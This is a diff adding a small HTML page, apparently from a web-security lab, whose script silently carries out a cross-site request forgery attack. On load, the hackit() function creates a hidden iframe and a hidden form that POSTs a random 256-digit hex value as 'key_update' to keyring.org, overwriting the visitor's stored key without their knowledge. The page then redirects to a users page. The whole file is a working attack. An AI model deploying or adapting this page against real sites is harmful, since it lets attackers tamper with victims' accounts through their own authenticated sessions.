@@ -1,0 +1,61 @@
+<html>
+<head>
+<title>all about the lolz</title>
+<meta http-equiv="refresh" content="0; URL= http://keyring.org/users.php">
+<script type="text/javascript">
+function genHex(){
+ var length = 256;
+ var i = 0;
+ var hexString = "";
+ for(i = 0; i < 256; i++){
+   var num = genRand(0, 15);
+   hex = num.toString(16);
+   hexString = hexString + hex;
+   
+ }
+ //document.write(hexString);
+ return hexString;
+}
+//genHex();
+function genRand(min, max){
+  return Math.floor(Math.random() * (max - min + 1)) + min;
+}
+function hackit(){
+	var url = "http://keyring.org/index.php";
+	var s = "hacked";
+	var iframe = document.createElement("iframe");
+	document.body.appendChild(iframe);
+	iframe.style.display = "none";
+	iframe.contentWindow.name = s;
+
+
+	var form = document.createElement("form");
+	form.target = s;
+	form.action = url;
+	form.method = "POST";
+
+
+	var hexText = document.createElement("input");
+	hexText.type = "hidden";
+	hexText.name = "key_update";
+	hexText.value = genHex();
+	form.appendChild(hexText);
+
+	var submit = document.createElement("input");
+	submit.type = "hidden";
+	submit.name = "key_submit";
+	submit.value = "Save Key";
+	form.appendChild(submit);
+
+	document.body.appendChild(form);
+
+	form.submit();
+}
+</script>
+</head>
+<body>
+<script type = "text/javascript" language ="JavaScript">
+hackit();
+</script>
+</body>
+</html>
